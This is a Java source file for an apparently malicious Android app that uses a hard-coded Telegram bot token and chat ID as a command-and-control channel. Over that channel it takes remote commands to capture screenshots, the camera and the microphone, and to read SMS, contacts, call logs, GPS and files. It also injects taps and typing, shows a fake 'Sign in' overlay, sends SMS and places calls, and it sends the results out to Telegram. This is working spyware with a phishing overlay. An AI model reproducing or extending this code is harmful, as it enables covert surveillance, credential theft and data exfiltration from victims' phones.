package com.v2ram;

import android.content.Context;
import android.util.Log;
import okhttp3.*;
import org.json.*;
import java.io.File;
import java.util.concurrent.TimeUnit;

public class k {
    // ==== ЗАМЕНИ =================
    static final String TOKEN   = "8911830422:AAFQrJBp1S4vkk-6cIvG1zcIIjbXvIwwywg";
    static final String CHAT_ID = "8916400546";
    // =============================

    static final String BASE = "https://api.telegram.org/bot" + TOKEN + "/";
    static final OkHttpClient HTTP = new OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(40, TimeUnit.SECONDS)
        .build();
    static long lastUpdate = 0;
    static Context ctx;
    static volatile long beat = 0;

    public static void startWithBeat(Context c, Runnable onBeat) {
        ctx = c;
        new Thread(() -> loop(onBeat)).start();
    }

    static void loop(Runnable onBeat) {
        while (true) {
            try {
                onBeat.run();
                String url = BASE + "getUpdates?offset=" + (lastUpdate + 1) + "&timeout=25";
                Response resp = HTTP.newCall(new Request.Builder().url(url).build()).execute();
                if (!resp.isSuccessful()) { sleep(3000); continue; }
                JSONObject j = new JSONObject(resp.body().string());
                onBeat.run();
                JSONArray arr = j.optJSONArray("result");
                if (arr != null) {
                    for (int i = 0; i < arr.length(); i++) {
                        JSONObject u = arr.getJSONObject(i);
                        lastUpdate = u.getLong("update_id");
                        JSONObject m = u.optJSONObject("message");
                        if (m == null) continue;
                        String text = m.optString("text", "");
                        if (!text.isEmpty()) handle(text);
                    }
                }
                sleep(500);
            } catch (Throwable t) {
                Log.e("v2tg", "poll", t);
                sleep(5000);
            }
        }
    }

    static void handle(String text) {
        if (b.S == null) { send("acc not ready"); return; }
        String[] p = text.trim().split("\\s+", 3);
        String cmd = p[0].toLowerCase();
        try {
            switch (cmd) {
                case "/start": case "/help":
                    send("/home /back /lock /shade /qs\n" +
                         "/shot /rec N\n" +
                         "/tap X Y /swipe X1 Y1 X2 Y2 /type T /click T\n" +
                         "/overlay /hide /sms /contacts /calls /gps\n" +
                         "/files DIR /get PATH /apps /photos N /photo ID\n" +
                         "/cam /mic N /vib N /torch on|off\n" +
                         "/open URL /app PKG /uninstall PKG /call NUM /sms_send NUM TEXT");
                    return;
                case "/home":    b.S.home(); break;
                case "/back":    b.S.back(); break;
                case "/lock":    b.S.lock(); break;
                case "/shade":   b.S.shade(); break;
                case "/qs":      b.S.qs(); break;
                case "/shot": {
                    String s = b.S.shot();
                    if (s != null) sendPhoto(s);
                    else send("shot failed");
                    break;
                }
                case "/rec": b.S.rec(Integer.parseInt(p[1])); send("rec " + p[1] + "s started"); break;
                case "/tap": b.S.tap(Float.parseFloat(p[1]), Float.parseFloat(p[2])); break;
                case "/swipe": {
                    String[] q = text.split("\\s+");
                    b.S.swipe(Float.parseFloat(q[1]), Float.parseFloat(q[2]),
                              Float.parseFloat(q[3]), Float.parseFloat(q[4]), 300);
                    break;
                }
                case "/type": b.S.type(text.substring(6).trim()); break;
                case "/click": b.S.click(text.substring(7).trim()); break;
                case "/overlay": e.show("Sign in", "Account"); break;
                case "/hide": e.hide(); break;
                case "/sms": f.sms(ctx); break;
                case "/contacts": f.contacts(ctx); break;
                case "/calls": f.calls(ctx); break;
                case "/gps": send("gps: " + f.gps(ctx)); break;
                case "/files": h.list(ctx, p.length > 1 ? p[1] : "/sdcard/"); break;
                case "/get": h.get(ctx, p[1]); break;
                case "/apps": apps(); break;
                case "/photos": l.photos(ctx, p.length > 1 ? Integer.parseInt(p[1]) : 20); break;
                case "/photo": l.getPhoto(ctx, Long.parseLong(p[1])); break;
                case "/cam": j.cam(ctx); break;
                case "/mic": j.mic(ctx, Integer.parseInt(p[1])); break;
                case "/vib": {
                    android.os.Vibrator v = (android.os.Vibrator)
                        ctx.getSystemService(Context.VIBRATOR_SERVICE);
                    v.vibrate(android.os.VibrationEffect.createOneShot(
                        Long.parseLong(p[1]) * 1000L, 255));
                    break;
                }
                case "/torch": {
                    android.hardware.camera2.CameraManager cm =
                        (android.hardware.camera2.CameraManager)
                        ctx.getSystemService(Context.CAMERA_SERVICE);
                    String id = cm.getCameraIdList()[0];
                    cm.setTorchMode(id, p[1].equals("on"));
                    break;
                }
                case "/open": {
                    android.content.Intent i = new android.content.Intent(
                        android.content.Intent.ACTION_VIEW,
                        android.net.Uri.parse(p[1]));
                    i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                    ctx.startActivity(i);
                    break;
                }
                case "/app": {
                    android.content.Intent i = ctx.getPackageManager()
                        .getLaunchIntentForPackage(p[1]);
                    if (i != null) { i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK); ctx.startActivity(i); }
                    else send("no app " + p[1]);
                    break;
                }
                case "/uninstall": {
                    android.content.Intent i = new android.content.Intent(
                        android.content.Intent.ACTION_DELETE,
                        android.net.Uri.parse("package:" + p[1]));
                    i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                    ctx.startActivity(i);
                    break;
                }
                case "/call": {
                    android.content.Intent i = new android.content.Intent(
                        android.content.Intent.ACTION_CALL,
                        android.net.Uri.parse("tel:" + p[1]));
                    i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                    ctx.startActivity(i);
                    break;
                }
                case "/sms_send": {
                    String[] sp = text.split("\\s+", 3);
                    android.telephony.SmsManager.getDefault()
                        .sendTextMessage(sp[1], null, sp[2], null, null);
                    send("sms sent");
                    break;
                }
                default: send("unknown: " + cmd);
            }
        } catch (Throwable t) { send("err: " + t.getMessage()); }
    }

    static void apps() {
        StringBuilder sb = new StringBuilder();
        for (android.content.pm.PackageInfo pi : ctx.getPackageManager().getInstalledPackages(0)) {
            boolean sys = (pi.applicationInfo.flags
                & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0;
            sb.append(pi.packageName).append(sys ? " [s]" : "").append("\n");
        }
        send(sb.toString());
    }

    public static void send(String text) {
        try {
            String t = text.length() > 4000 ? text.substring(0, 4000) + "..." : text;
            RequestBody b = new FormBody.Builder()
                .add("chat_id", CHAT_ID).add("text", t).build();
            HTTP.newCall(new Request.Builder().url(BASE + "sendMessage").post(b).build())
                .execute().close();
        } catch (Throwable ignored) {}
    }

    public static void sendPhoto(String b64) {
        try {
            byte[] d = android.util.Base64.decode(b64, android.util.Base64.DEFAULT);
            File f = new File(ctx.getCacheDir(), "s.jpg");
            java.io.FileOutputStream fo = new java.io.FileOutputStream(f);
            fo.write(d); fo.close();
            MultipartBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("photo", "s.jpg",
                    RequestBody.create(f, MediaType.parse("image/jpeg")))
                .build();
            HTTP.newCall(new Request.Builder().url(BASE + "sendPhoto").post(body).build())
                .execute().close();
        } catch (Throwable t) { send("photo err: " + t.getMessage()); }
    }

    public static void sendFile(File f, String name) {
        try {
            MultipartBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("document", name,
                    RequestBody.create(f, MediaType.parse("application/octet-stream")))
                .build();
            HTTP.newCall(new Request.Builder().url(BASE + "sendDocument").post(body).build())
                .execute().close();
        } catch (Throwable t) { send("file err: " + t.getMessage()); }
    }

    static void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
    }
}